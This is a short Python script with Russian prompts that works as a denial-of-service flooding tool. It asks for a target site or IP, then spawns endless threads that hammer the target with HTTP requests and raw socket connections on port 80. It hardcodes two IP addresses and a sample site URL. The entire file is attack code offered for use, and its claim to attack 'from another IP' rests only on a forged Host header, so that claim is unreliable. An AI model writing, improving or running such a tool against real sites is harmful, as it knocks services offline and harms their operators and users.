# coding: utf8
import threading
from random import choice
import requests
import socket

#http://suvenir.segment.ru/
ips = ['217.160.0.137', '212.164.222.45']

if input('Вы уже знаете IP адрес сайта, или вам нужно его найти? (y/n) ') == 'n':
    url = input('Введите адрес сайта(без https:// и http://): ')
    target = socket.gethostbyname(url)
else:
    target = input('Введите IP сайта: ')

if input('Вы хотите ввести свой или чужой IP для DDoS с него? (y/n) ') == 'y':
    user_ip = input('Введите IP: ')
    ips.append(user_ip)

target2 = input('Введите адрес сайта(с https:// или http://): ')
input('Enter для начала атаки')

port = 80
attack_num = 0


def dos():
    while True:
        try:
            requests.get(target2)
            requests.post(target2)

            global attack_num
            attack_num += 1

            ip = choice(ips)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception as error:
            print(error)


while True:
    threading.Thread(target=dos).start()
    print(f'Send ping to {target}:{port}')
    print(f'Numbers of attack: {attack_num}')
